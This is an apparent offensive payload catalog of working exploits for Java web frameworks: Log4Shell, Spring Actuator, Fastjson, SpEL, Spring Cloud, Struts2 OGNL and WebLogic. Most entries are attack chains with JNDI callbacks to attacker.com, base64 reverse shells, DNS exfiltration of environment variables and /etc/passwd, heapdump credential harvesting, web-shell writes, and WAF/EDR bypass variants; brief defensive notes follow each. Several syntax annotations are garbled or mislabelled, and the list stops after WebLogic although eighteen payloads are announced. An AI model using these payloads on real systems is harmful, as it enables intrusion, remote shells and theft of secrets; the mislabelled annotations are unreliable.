# Framework Vulnerabilities

_18 web payloads_

### Log4j RCE (Log4Shell)  `log4j-rce`
_Apache Log4j remote code execution vulnerability_
Subcategory: **Log4j** · tags: `log4j` `rce` `cve-2021-44228` `log4shell`

**Prerequisites:**
- Uses Log4j 2.x
- User input is written to logs

**Attack Chain:**

**1. Probe the vulnerability**
> Probe for the Log4j vulnerability
```
Inject at any input point:
${jndi:ldap://attacker.com/test}
Observe whether there is a DNS callback
```
**Syntax breakdown:**
- `jndi:` — JNDI lookup _method_
- `ldap:` — LDAP protocol _method_

**2. DNS exfiltration test**
> Exfiltrate sensitive information
```
${jndi:ldap://${env:USER}.attacker.com}
${jndi:ldap://${sys:java.version}.attacker.com}
Exfiltrate environment variables or system properties
```
**Syntax breakdown:**
- `${env:USER}` — retrieve environment variable _value_
- `${sys:java.version}` — retrieve system property _value_

**3. Set up a malicious LDAP server**
> Build the RCE payload
```
Use JNDIExploit or rogue-jndi:
java -jar JNDIExploit.jar -i attacker.com
Build the payload:
${jndi:ldap://attacker.com:1389/Basic/Command/base64/d2hvYW1p}
```
**Syntax breakdown:**
- `Basic/Command` — LDAP route that executes commands _value_
- `base64` — Base64-encoded command _encoding_

**4. Obtain a shell**
> Obtain a reverse shell
_platform: linux_
```
${jndi:ldap://attacker.com:1389/Basic/Command/base64/YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci80NDQ0IDA+JjE=}
Base64 decodes to: bash -i >& /dev/tcp/attacker/4444 0>&1
```
**Syntax breakdown:**
- `base64` — Base64 encoding _encoding_
- `jndi:` — JNDI lookup _method_
- `ldap:` — LDAP protocol _method_

**WAF/EDR Bypass Variants:**

**Bypass keyword filtering**
> Bypass using nested expressions
```
${${lower:j}ndi:ldap://attacker.com}
${${upper:j}ndi:${lower:l}dap://attacker.com}
${${::-j}${::-n}${::-d}${::-i}:ldap://attacker.com}
```
**Syntax breakdown:**
- `${lower:j}` — convert j to lowercase _value_
- `${::-j}` — default-value syntax _value_

**Bypass special-character filtering**
> Build the protocol string
```
${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://attacker.com}
${jndi:dns://attacker.com}
```
**Syntax breakdown:**
- `jndi:` — JNDI lookup _method_

**Overview:** Log4Shell (CVE-2021-44228) is a remote code execution vulnerability in Apache Log4j 2.x. Through JNDI injection (${jndi:ldap://...}) it triggers remote class loading during logging, affecting millions of Java applications, and is one of the most severe security vulnerabilities of recent years.

**Vulnerability Principle:** Log4j JNDI injection uses the ${jndi:ldap://attacker/exploit} expression in log messages to trigger LDAP/RMI remote class loading. Affected versions (2.0-2.14.1) automatically parse nested expressions during logging; an attacker who controls any logged input (User-Agent, search terms, etc.) can trigger RCE.

**Exploitation Method:** Full exploitation flow:
1. Find a point where user input is logged
2. Inject the JNDI payload
3. Set up a malicious LDAP server
4. Load the malicious class to execute commands

**Defensive Measures:** Defensive measures:
1. Upgrade Log4j to the latest version
2. Set formatMsgNoLookups=true
3. Remove the JndiLookup class
4. Use a WAF to filter JNDI patterns

---

### Spring Actuator Vulnerabilities  `spring-actuator`
_Spring Boot Actuator endpoint security vulnerabilities_
Subcategory: **Spring** · tags: `spring` `actuator` `rce` `java`

**Prerequisites:**
- Spring Boot application
- Actuator endpoints are exposed

**Attack Chain:**

**1. Probe Actuator endpoints**
> Probe exposed Actuator endpoints
```
/actuator
/actuator/env
/actuator/health
/actuator/mappings
/actuator/configprops
/actuator/heapdump
```
**Syntax breakdown:**
- `/actuator` — Actuator root endpoint _value_
- `/env` — environment variables endpoint _value_
- `/heapdump` — heap dump endpoint _value_

**2. Retrieve sensitive information**
> Retrieve environment variables and configuration
```
/actuator/env
View database passwords, API keys, etc.
/actuator/configprops
View configuration properties
```
**Syntax breakdown:**
- `/actuator/env` — command/keyword _command_

**3. Download the heap dump**
> Download and analyze the heap dump
```
curl -o heapdump http://target.com/actuator/heapdump
Analyze with the Memory Analyzer Tool
Search for keywords such as password and secret
```
**Syntax breakdown:**
- `heapdump` — JVM heap memory dump _value_

**4. RCE via the env endpoint**
> Execute commands via the env endpoint
```
POST /actuator/env
Content-Type: application/x-www-form-urlencoded
spring.datasource.hikari.connection-test-query=CREATE ALIAS T5 AS CONCAT('String exec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} return null;}')

POST /actuator/restart
```
**Syntax breakdown:**
- `CONCAT` — string concatenation _function_
- `EXEC` — execute a stored procedure _keyword_
- `;` — command separator _operator_
- `Content-Type` — content type header _header_
- `Runtime.exec` — Java command execution _function_

**WAF/EDR Bypass Variants:**

**Path traversal and semicolon parameter tricks**
> The Spring framework's semicolon path-parameter feature allows inserting semicolon segments into the URL to bypass path-matching rules; combined with double encoding and path traversal, it accesses restricted Actuator endpoints
```
# Semicolon path-parameter bypass (Spring feature):
/;/actuator/env
/actuator;.js/env
/actuator/..;/actuator/env

# Double URL encoding:
/%61%63%74%75%61%74%6f%72/env
/actuator/%65%6e%76

# Path traversal:
/random/../actuator/env
/api/v1/../../actuator/heapdump
```
**Syntax breakdown:**
- `# Semicolon path-parameter bypass (Spring feature):` — primary command _command_
- `...` — 10 lines total _value_

**HTTP method override and Content-Type bypass**
> Use the X-HTTP-Method-Override header to override the request method, or use a non-standard Content-Type and case variations to bypass WAF blocking of POST requests to Actuator endpoints
```
# HTTP method override:
GET /actuator/env HTTP/1.1
X-HTTP-Method-Override: POST

# Content-Type bypass:
POST /actuator/env HTTP/1.1
Content-Type: application/x-www-form-urlencoded
spring.cloud.bootstrap.location=http://attacker.com/payload.yml

# Case bypass:
/Actuator/Env
/ACTUATOR/ENV
```
**Syntax breakdown:**
- `# HTTP method override:` — primary command _command_
- `...` — 10 lines total _value_

**Overview:** Spring Actuator provides production-grade monitoring and management features; misconfiguration can leak sensitive information or lead to RCE.

**Vulnerability Principle:** Spring Boot Actuator exposes many management endpoints: /env leaks environment variables and database passwords, /heapdump lets you download the JVM heap memory (containing keys/credentials), /jolokia can execute code via JMX, and /gateway/routes (Spring Cloud Gateway) can inject SpEL to achieve RCE.

**Exploitation Method:** Full exploitation flow:
1. Probe the exposed endpoints
2. Retrieve environment variables and configuration
3. Download and analyze the heap dump
4. Exploit the env endpoint for RCE

**Defensive Measures:** Defensive measures:
1. Restrict access to Actuator endpoints
2. Disable sensitive endpoints
3. Protect with Spring Security
4. Disable heapdump in production

---

### Fastjson RCE  `fastjson-rce`
_Alibaba Fastjson deserialization remote code execution_
Subcategory: **Fastjson** · tags: `fastjson` `rce` `deserialization` `java`

**Prerequisites:**
- Uses the Fastjson library
- A deserialization point exists

**Attack Chain:**

**1. Probe Fastjson**
> Probe the Fastjson version
```
Send a JSON request and observe the response:
{"@type":"java.net.Inet4Address","val":"attacker.com"}
Observe whether there is a DNS callback
```
**Syntax breakdown:**
- `@type` — Fastjson type specifier _value_
- `java.net.Inet4Address` — class that triggers DNS resolution _value_

**2. JNDI injection**
> JNDI injection RCE
```
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com:1389/Exploit","autoCommit":true}
```
**Syntax breakdown:**
- `JdbcRowSetImpl` — exploitable JDBC class _value_
- `dataSourceName` — JNDI data source name _value_
- `autoCommit` — triggers the JNDI lookup _value_

**3. Set up a malicious service**
> Set up a malicious LDAP/RMI service
```
Use JNDIExploit:
java -jar JNDIExploit.jar -i attacker.com
Or use marshalsec:
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#Exploit 1389
```
**Syntax breakdown:**
- `Use JNDIExploit:` — command/keyword _command_

**4. Bypass the AutoType check**
> Bypass the AutoType blacklist
```
1.2.47 version bypass:
{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com/Exploit","autoCommit":true}}
```
**Syntax breakdown:**
- `ldap:` — LDAP protocol _method_

**WAF/EDR Bypass Variants:**

**Unicode encoding and nested JSON bypass**
> Bypass WAF detection of Fastjson signatures by Unicode (\u0040) or hex (\x40) encoding the @type field name, or by using nested JSON structures
```
# Unicode-encoded @type:
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com/Exploit","autoCommit":true}

# Hex encoding:
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com/Exploit","autoCommit":true}

# Nested JSON obfuscation:
{"a":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com/Exploit","autoCommit":true}}
```
**Syntax breakdown:**
- `# Unicode-encoded @type:` — primary command _command_
- `...` — 6 lines total _value_

**BCEL ClassLoader and version-specific chains**
> Use version-specific exploit chains for different Fastjson versions: BCEL ClassLoader loading bytecode, 1.2.47 cache poisoning, and 1.2.68 expectClass allowlist bypass
```
# BCEL ClassLoader(Fastjson 1.1.15-1.2.24):
{"@type":"com.sun.org.apache.bcel.internal.util.ClassLoader","":"$$BCEL$$$l$8b..."}

# Fastjson 1.2.47 AutoType bypass:
{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com/Exploit","autoCommit":true}}

# Fastjson 1.2.68 expectClass bypass:
{"@type":"java.lang.AutoCloseable","@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com/Exploit","autoCommit":true}
```
**Syntax breakdown:**
- `# BCEL ClassLoader (Fastjson 1.1.15-1.2.24):` — primary command _command_
- `...` — 6 lines total _value_

**Overview:** Fastjson is a Java JSON library developed by Alibaba. Its autoType feature allows a JSON document to specify a Java class for deserialization; attackers can abuse this feature to load malicious classes and achieve remote code execution, affecting a large number of Java applications.

**Vulnerability Principle:** Fastjson vulnerabilities specify the Java class to deserialize via the @type field: below 1.2.24 JdbcRowSetImpl can be used directly to trigger JNDI injection; 1.2.25-1.2.47 bypass the autoType blacklist (java.lang.Class cache bypass); below 1.2.68 use the expectClass bypass. The exploit chain must be paired with LDAP/RMI remote loading of a malicious class.

**Exploitation Method:** Full exploitation flow:
1. Confirm the Fastjson version
2. Build the JNDI injection payload
3. Set up a malicious LDAP service
4. Load the malicious class to execute commands

**Defensive Measures:** Defensive measures:
1. Upgrade Fastjson to the latest version
2. Disable AutoType
3. Configure safeMode
4. Use a security filter

---

### Spring SpEL Injection  `spring-spel`
_Spring Expression Language injection attack_
Subcategory: **Spring SpEL** · tags: `spring` `spel` `expression` `rce`

**Prerequisites:**
- Uses the Spring framework
- A SpEL injection point exists

**Attack Chain:**

**1. Probe SpEL injection**
> Probe for a SpEL injection point
```
# Test expression evaluation
${7*7}
#{7*7}
${T(java.lang.Runtime).getRuntime()}

# Observe the response
# If it returns 49 or executes successfully, the vulnerability exists
```
**Syntax breakdown:**
- `${...}` — Spring expression syntax _value_
- `#{...}` — SpEL expression syntax _value_
- `T()` — type reference _function_

**2. Command execution**
> Execute system commands
```
# Execute commands via Runtime
${T(java.lang.Runtime).getRuntime().exec("id")}
#{T(java.lang.Runtime).getRuntime().exec("whoami")}

# ProcessBuilder
${new java.lang.ProcessBuilder(new String[]{"id"}).start()}
#{new java.lang.ProcessBuilder(new String[]{"cmd","/c","whoami"}).start()}

# Reverse shell
${T(java.lang.Runtime).getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci9QMDBBIA==}|{base64,-d}|{bash,-i}")}
```
**Syntax breakdown:**
- `T(java.lang.Runtime)` — reference the Runtime class _value_
- `getRuntime()` — get the Runtime instance _function_
- `exec()` — execute a command _function_

**3. File reading**
> Read sensitive files
```
# Read a file
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec("cat /etc/passwd").getInputStream())}

# Use Scanner
#{new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("cat /etc/passwd").getInputStream()).useDelimiter("\\A").next()}

# Direct read
${T(java.nio.file.Files).readAllLines(T(java.nio.file.Paths).get("/etc/passwd"))}
```
**Syntax breakdown:**
- `EXEC` — execute a stored procedure _keyword_
- `/etc/passwd` — sensitive file path _path_
- `Runtime.exec` — Java command execution _function_

**4. DNS exfiltration**
> DNS-exfiltrate data
```
# DNS-exfiltrate data
${T(java.net.InetAddress).getByName("attacker.com")}

# Exfiltrate file contents
${T(java.net.InetAddress).getByName(T(java.lang.String).valueOf(T(java.nio.file.Files).readAllBytes(T(java.nio.file.Paths).get("/etc/passwd"))).substring(0,20)+".attacker.com")}
```
**Syntax breakdown:**
- `getByName` — resolves a domain, triggering a DNS request _value_

**WAF/EDR Bypass Variants:**

**String concatenation**
> Bypass via string concatenation
```
# Bypass keyword filtering
${T(java.lang.Run"+"time).getRun"+"time().exec("id")}
#{T(String).getClass().forName("java.la"+"ng.Runtime").getMethod("exec",T(String)).invoke(T(String).getClass().forName("java.la"+"ng.Runtime").getMethod("getRuntime").invoke(null),"id")}
```
**Syntax breakdown:**
- `EXEC` — execute a stored procedure _keyword_
- `Runtime.exec` — Java command execution _function_

**Reflection bypass**
> Reflection bypass
```
# Use reflection
#{T(Class).forName("java.lang.Runtime").getMethod("exec",T(String)).invoke(T(Class).forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")}

# Use ScriptEngine
#{T(javax.script.ScriptEngineManager).newInstance().getEngineByName("js").eval("java.lang.Runtime.getRuntime().exec(\\"id\\")")}
```
**Syntax breakdown:**
- `EXEC` — execute a stored procedure _keyword_
- `eval()` — code execution _function_
- `Runtime.exec` — Java command execution _function_

**Overview:** Spring Expression Language (SpEL) injection is a serious vulnerability in the Spring framework that allows an attacker to execute arbitrary Java code within the SpEL expression context. Affected components include Spring MVC, Spring Cloud, Spring Data, and several other modules.

**Vulnerability Principle:** SpEL injection executes system commands via T(java.lang.Runtime).getRuntime().exec(), or loads remote classes via the ClassLoader. Trigger points include Spring Cloud Gateway route predicates/filters, the Spring Data @Value annotation, Thymeleaf preprocessing expressions, and Spring Security OAuth error handling.

**Exploitation Method:** Full exploitation flow:
1. Probe for a SpEL injection point
2. Confirm expression evaluation
3. Execute commands via Runtime
4. Read sensitive files or get a reverse shell

**Defensive Measures:** Defensive measures:
1. Avoid using user input directly in expressions
2. Use SimpleEvaluationContext
3. Input validation and filtering
4. Upgrade the Spring version

---

### Spring Cloud Vulnerabilities  `spring-cloud`
_Exploitation of Spring Cloud-related vulnerabilities_
Subcategory: **Spring Cloud** · tags: `spring` `cloud` `rce` `deserialization`

**Prerequisites:**
- Uses Spring Cloud
- A vulnerable version exists

**Attack Chain:**

**1. Spring Cloud Gateway RCE**
> Spring Cloud Gateway RCE
```
# CVE-2022-22947
# Add a malicious route
POST /actuator/gateway/routes/hack HTTP/1.1
Content-Type: application/json

{
  "id": "hack",
  "filters": [{
    "name": "AddResponseHeader",
    "args": {
      "name": "Result",
      "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}"
    }
  }],
  "uri": "http://example.com"
}

# Refresh routes
POST /actuator/gateway/refresh

# View the result
GET /actuator/gateway/routes/hack
```
**Syntax breakdown:**
- `actuator/gateway/routes` — Gateway route management endpoint _encoding_
- `AddResponseHeader` — add-response-header filter _encoding_

**2. Spring Cloud Function SpEL**
> Spring Cloud Function SpEL injection
```
# CVE-2022-22963
# Modify the request header to trigger SpEL
POST /functionRouter HTTP/1.1
spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("id")
Content-Type: text/plain

payload
```
**Syntax breakdown:**
- `spring.cloud.function.routing-expression` — routing expression header _value_

**3. Spring Cloud Netflix**
> Spring Cloud Netflix vulnerabilities
```
# CVE-2020-5410 directory traversal
GET /..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd

# Eureka Server SSRF
POST /eureka/apps
# Configure serviceUrl to point to an internal service
```
**Syntax breakdown:**
- `%xx` — URL encoding _encoding_

**WAF/EDR Bypass Variants:**

**Encoding bypass**
> Encoding bypass
```
# URL-encoding bypass
..%252f = ..%2f = ../

# Double URL encoding
..%252f..%252f
```
**Syntax breakdown:**
- `#` — command/payload prefix _command_
- ` URL-encoding bypass
..%252f = ..%2f = ../

# Double URL encoding
..%252f..%252f` — parameter and payload content _value_

**Overview:** Spring Cloud is a core framework in microservice architectures, and its security vulnerabilities can affect an entire microservice cluster. Known high-risk vulnerabilities include Spring Cloud Gateway SpEL injection (CVE-2022-22947) and Spring Cloud Function RCE (CVE-2022-22963).

**Vulnerability Principle:** Spring Cloud vulnerabilities: 1) Gateway Actuator SpEL injection (add a route containing SpEL via /actuator/gateway/routes) 2) Cloud Function injects SpEL via the spring.cloud.function.routing-expression header 3) Config Server path traversal reads arbitrary files.

**Exploitation Method:** Full exploitation flow:
1. Identify Spring Cloud components
2. Detect Actuator endpoints
3. Exploit a known CVE
4. Execute commands or read files

**Defensive Measures:** Defensive measures:
1. Upgrade to a secure version
2. Disable unnecessary Actuator endpoints
3. Enforce access control
4. Monitor anomalous requests

---

### Struts2 Remote Code Execution  `struts2-rce`
_Apache Struts2 framework RCE vulnerabilities_
Subcategory: **Struts2** · tags: `struts2` `rce` `java` `apache`

**Prerequisites:**
- Uses the Struts2 framework
- A vulnerable version exists

**Attack Chain:**

**1. S2-045 vulnerability**
> S2-045 Content-Type injection
```
# CVE-2017-5638
# Content-Type header injection
Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
```
**Syntax breakdown:**
- `multipart/form-data` — Content-Type that triggers the vulnerability _value_
- `#dm` — default member access _value_
- `#cmd` — the command to execute _value_

**2. S2-046 vulnerability**
> S2-046 Content-Disposition injection
```
# CVE-2017-5638
# Content-Disposition injection
Content-Disposition: form-data; name="upload"; filename="%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test','vulnerable')}"

# Full RCE
Content-Disposition: form-data; name="upload"; filename="%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess=#dm).(#cmd='id').(#cmds={'/bin/bash','-c',#cmd}).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}"
```

**3. S2-057 vulnerability**
> S2-057 URL namespace injection
```
# CVE-2018-11776
# URL namespace injection
http://target/${(111+111)}/test.action
# If it returns 222, the vulnerability exists

# RCE
http://target/${(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess=#dm).(#cmd='id').(#cmds={'/bin/bash','-c',#cmd}).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}/test.action
```
**Syntax breakdown:**
- `OGNL` — OGNL expression _format_

**4. S2-061/S2-062 vulnerabilities**
> S2-061/062 OGNL injection
```
# CVE-2020-17530
# OGNL expression injection
POST /action HTTP/1.1
Content-Type: application/x-www-form-urlencoded

id=%25%7b%23dm%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS.%40java.lang.Runtime%40getRuntime().exec(%27id%27)%7d

# After decoding
id=%{#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS.@java.lang.Runtime@getRuntime().exec('id')}
```
**Syntax breakdown:**
- `EXEC` — execute a stored procedure _keyword_
- `Content-Type` — content type header _header_
- `%xx` — URL encoding _encoding_
- `OGNL` — OGNL expression _format_
- `Runtime.exec` — Java command execution _function_

**WAF/EDR Bypass Variants:**

**Encoding bypass**
> Encoding bypass
```
# URL encoding
%{#cmd} = %25%7b%23cmd%7d

# Unicode encoding
\u0025{#cmd}

# Double encoding
%2525%257b%2523cmd%257d
```
**Syntax breakdown:**
- `#` — command/payload prefix _command_
- ` URL encoding
%{#cmd} = %25%7b%23cmd%7d

# Unicode encoding
\%{#cmd}

# Double encoding
%2525%257b%2523cmd%257d` — parameter and payload content _value_

**Expression variants**
> Expression-variant bypass
```
# Different expression syntaxes
${...}
%{...}
#{...}
@{...}

# Use static methods
@java.lang.Runtime@getRuntime()
new java.lang.ProcessBuilder()
```
**Syntax breakdown:**
- `# Different expression syntaxes
${...}
%{...}
#{...}
@{...}

# Use static methods
@java` — template expression injection _value_

**Overview:** Apache Struts2 is a classic Java web framework that has historically had many RCE vulnerabilities (S2-001 through S2-066+), mostly stemming from OGNL expression injection. Struts2 vulnerabilities caused major data breaches such as the US Equifax incident and remain a prime target for attackers.

**Vulnerability Principle:** Struts2 RCE vulnerabilities exploit OGNL (Object-Graph Navigation Language) expression injection: %{expression} or ${expression} is parsed as an OGNL expression when processing user input and executes Java code. High-risk CVEs include S2-045 (Content-Type header), S2-046 (filename), and S2-057 (namespace).

**Exploitation Method:** Full exploitation flow:
1. Identify the Struts2 framework
2. Detect the vulnerable version
3. Choose an appropriate CVE exploit
4. Execute commands or get a reverse shell

**Defensive Measures:** Defensive measures:
1. Upgrade to the latest version
2. Disable dynamic method invocation
3. Strictly filter user input
4. Deploy a WAF

---

### Struts2 OGNL Expression Injection  `struts2-ognl`
_Detailed explanation of Struts2 OGNL expression injection techniques_
Subcategory: **Struts2 OGNL** · tags: `struts2` `ognl` `expression` `injection`

**Prerequisites:**
- Uses the Struts2 framework
- An OGNL injection point exists

**Attack Chain:**

**1. OGNL basic syntax**
> OGNL basic syntax
```
# Access object properties
#object.property
#object['property']

# Call methods
#object.method()
#object.method(arg1, arg2)

# Static method calls
@package.ClassName@method()
@java.lang.Runtime@getRuntime()

# Create objects
new java.lang.String("test")
new java.lang.ProcessBuilder(new String[]{"id"})
```
**Syntax breakdown:**
- `#` — access an OGNL context variable _value_
- `@` — access a static member _value_
- `new` — create a new object _value_

**2. Bypass security restrictions**
> Bypass security restrictions
```
# Get DEFAULT_MEMBER_ACCESS
#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS

# Set member access
#_memberAccess=#dm

# Clear excluded classes
#ognlUtil.getExcludedClasses().clear()
#ognlUtil.getExcludedPackageNames().clear()

# Full bypass
(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm))))
```
**Syntax breakdown:**
- `OGNL` — OGNL expression _format_

**3. Command execution techniques**
> Command execution techniques
```
# Use Runtime
#cmd='id'
#cmds={'/bin/bash','-c',#cmd}
#p=new java.lang.ProcessBuilder(#cmds)
#process=#p.start()

# Get the output
#is=#process.getInputStream()
#ros=@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()
@org.apache.commons.io.IOUtils@copy(#is,#ros)

# String output
@org.apache.commons.io.IOUtils@toString(#process.getInputStream())
```

**4. File operations**
> File operations
```
# Read a file
new java.util.Scanner(new java.io.File("/etc/passwd")).useDelimiter("\\A").next()

# Write a file
new java.io.FileOutputStream("shell.jsp").write(new sun.misc.BASE64Decoder().decodeBuffer("BASE64_SHELL").getBytes())

# List a directory
new java.io.File("/").list()
```
**Syntax breakdown:**
- `/etc/passwd` — sensitive file path _path_
- `base64` — Base64 encoding _encoding_

**WAF/EDR Bypass Variants:**

**Character encoding bypass**
> Character encoding bypass
```
# Unicode encoding
\u0069d = id
\u0027 = '

# Hex
\x69\x64 = id

# String concatenation
"i"+"d" = "id"
'id'.substring(0,2)
```
**Syntax breakdown:**
- `\uXXXX` — Unicode encoding _encoding_

**Reflection bypass**
> Reflection bypass
```
# Use reflection calls
#cls=@java.lang.Class@forName("java.lang.Runtime")
#method=#cls.getMethod("getRuntime")
#rt=#method.invoke(null)
#exec=#cls.getMethod("exec",@java.lang.String@class)
#exec.invoke(#rt,"id")
```
**Syntax breakdown:**
- `#` — command/payload prefix _command_
- ` Use reflection calls
#cls=@java.lang.Class@forName("java.lang.Runtime")
#method=#cls.getMethod("getRuntime")
#rt=#method.invoke(null)
#exec=#cls.getMethod("exec",@java.lang.String@class)
#exec.invoke(#rt,"id")` — parameter and payload content _value_

**Overview:** OGNL is the core expression language of Struts2, providing powerful access to the Java object graph. OGNL injection can create ProcessBuilder/Runtime objects to execute system commands, and is the root cause of the vast majority of Struts2 RCE vulnerabilities in history.

**Vulnerability Principle:** OGNL injection exploitation methods: 1) modify the security manager configuration via #_memberAccess 2) use @java.lang.Runtime@getRuntime().exec() to execute commands 3) create a process with ProcessBuilder 4) load remote malicious classes via the ClassLoader 5) OGNL sandbox bypass techniques continually evolve across Struts2 versions.

**Exploitation Method:** Full exploitation flow:
1. Understand OGNL syntax
2. Bypass security restrictions
3. Execute system commands
4. Obtain command output

**Defensive Measures:** Defensive measures:
1. Upgrade the Struts2 version
2. Strictly filter user input
3. Disable OGNL expressions
4. Configure security restrictions

---

### WebLogic Remote Code Execution  `weblogic-rce`
_Oracle WebLogic Server RCE vulnerabilities_
Subcategory: **WebLogic** · tags: `weblogic` `rce` `java` `oracle`

**Prerequisites:**
- Uses WebLogic Server
- A vulnerable version exists

**Attack Chain:**

**1. CVE-2017-10271**
> CVE-2017-10271 XMLDecoder
```
# XMLDecoder deserialization
POST /wls-wsat/CoordinatorPortType HTTP/1.1
Content-Type: text/xml

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
      <java>
        <object class="java.lang.ProcessBuilder">
          <array class="java.lang.String" length="3">
            <void index="0"><string>/bin/bash</string></void>
            <void index="1"><string>-c</string></void>
            <void index="2"><string>id</string></void>
          </array>
          <void method="start"/>
        </object>
      </java>
    </work:WorkContext>
  </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>
```
**Syntax breakdown:**
- `wls-wsat` — WebLogic web service endpoint _value_
- `ProcessBuilder` — Java process builder _value_
- `void method="start"` — calls the start method to execute the command _value_

**2. CVE-2019-2725**
> CVE-2019-2725 AsyncResponseService
```
# New-version XMLDecoder bypass
POST /_async/AsyncResponseService HTTP/1.1
Content-Type: text/xml

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing">
  <soapenv:Header>
    <wsa:Action>xx</wsa:Action>
    <wsa:RelatesTo>xx</wsa:RelatesTo>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
      <java class="java.beans.XMLDecoder">
        <void class="java.lang.ProcessBuilder">
          <array class="java.lang.String" length="3">
            <void index="0"><string>/bin/bash</string></void>
            <void index="1"><string>-c</string></void>
            <void index="2"><string>id</string></void>
          </array>
          <void method="start"/>
        </void>
      </java>
    </work:WorkContext>
  </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>
```
**Syntax breakdown:**
- `POST` — HTTP method _method_
- `Content-Type` — content type _header_

**3. CVE-2020-14882**
> CVE-2020-14882 Console RCE
```
# Unauthorized access + command execution
# Login bypass
GET /console/css/%252e%252e%252fconsole.portal HTTP/1.1

# Command execution
GET /console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27id%27);%22) HTTP/1.1
```
**Syntax breakdown:**
- `%252e%252e` — double-URL-encoded .. _encoding_
- `ShellSession` — Coherence MVEL Shell _value_

**WAF/EDR Bypass Variants:**

**Path encoding bypass**
> Path encoding bypass
```
# Different encoding schemes
/console/css/..;/console.portal
/console/css/%2e%2e/console.portal
/console/css/%252e%252e/console.portal
/console/css/..%252fconsole.portal
```
**Syntax breakdown:**
- `#` — command/payload prefix _command_
- ` Different encoding schemes
/console/css/..;/console.portal
/console/css/%2e%2e/console.portal
/console/css/%252e%252e/console.portal
/console/css/..%252fconsole.portal` — parameter and payload content _value_

**XML variants**
> XML-variant bypass
```
# Use different XML tags
<void class="java.lang.Runtime" method="getRuntime">
<void method="exec">
<string>id</string>
</void>
</void>

# Use array form
<array class="java.lang.String" length="1">
<void index="0"><string>id</string></void>
</array>
```
**Syntax breakdown:**
- `# Use different XML tags
<void class="java.lang.Runtime" method="getRuntime">
<void method=` — attack payload _value_

**Overview:** Oracle WebLogic Server is an enterprise-grade Java application server, and vulnerabilities such as T3/IIOP deserialization, SSRF, and remote code execution keep appearing. WebLogic vulnerabilities can usually directly grant server privileges, making it a top target for attackers in Java environments.

